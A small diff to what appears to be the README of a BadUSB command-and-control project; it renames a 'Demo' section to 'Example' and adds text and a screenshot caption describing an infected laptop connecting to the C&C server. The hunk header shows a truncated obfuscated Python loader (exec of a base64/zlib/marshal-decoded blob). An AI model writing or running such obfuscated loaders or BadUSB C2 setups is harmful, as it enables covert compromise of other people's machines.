@@ -128,7 +128,11 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmBgYCgtyskvSM3TUM
 ```
 
 
-## Demo  
+## Example	
+Below is an example of a client connecting to the C&C server. This is actually Ryan's laptop connecting, after plugging the BadUSB device into it. 
+
+![infected](./images/infected.png)
+**Figure 11:** Session on x at wartop (Ryan's Laptop).
 
 
 
